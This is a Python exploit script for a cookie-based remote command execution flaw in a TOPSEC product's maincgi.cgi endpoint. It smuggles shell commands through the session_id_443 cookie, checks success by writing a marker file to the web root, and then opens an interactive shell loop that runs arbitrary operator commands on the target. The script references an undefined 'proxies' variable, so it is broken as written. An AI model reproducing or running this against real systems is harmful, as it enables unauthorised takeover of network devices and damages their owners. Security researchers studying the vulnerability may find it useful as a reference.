import requests
import urllib3
import re
from urllib.parse import urljoin
import argparse
import random
import string
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string


def run(url):
    target = urljoin(url, "/cgi/maincgi.cgi?Url=LUY")
    random_string = generate_random_string(9)
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
            "Cookie": "session_id_443=1|echo 'Klmiuhgs' > /www/htdocs/site/image/{};".format(random_string)
        }
        command_response = requests.get(target, headers=headers, verify=False, proxies=proxies)
        if command_response.status_code == 200 and "window" in command_response.text and "self" in command_response.text  and "opener" in command_response.text:
            result_url = urljoin(url, "/site/image/{}".format(random_string))
            command_response = requests.get(result_url, headers=headers, verify=False, proxies=proxies)
            if command_response.status_code == 200 and "Klmiuhgs" in command_response.text:
                print("\033[31mDiscovered: TOPSEC-product Cookie Remote Command Execution Vulnerability!:\033[0m")
                result_url = urljoin(url, "/site/image/{}".format(random_string))
                while True:
                    command = input("\033[34mPlease input command (stop input:exit):\033[0m")
                    if "exit" not in command:
                        command_headers = {
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
                            "Cookie": "session_id_443=1|echo $({})> /www/htdocs/site/image/{};".format(command,random_string)
                        }
                        requests.get(target, headers=command_headers, verify=False, proxies=proxies)
                        result_response = requests.get(result_url, headers=command_headers, timeout=15,verify=False, proxies=proxies)
                        print(result_response.text)
                    else:
                        break
    except Exception as e:
        print(e)
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    args = parser.parse_args()
    url = args.url
    if url:
        run(url)
    else:
        print("URL")
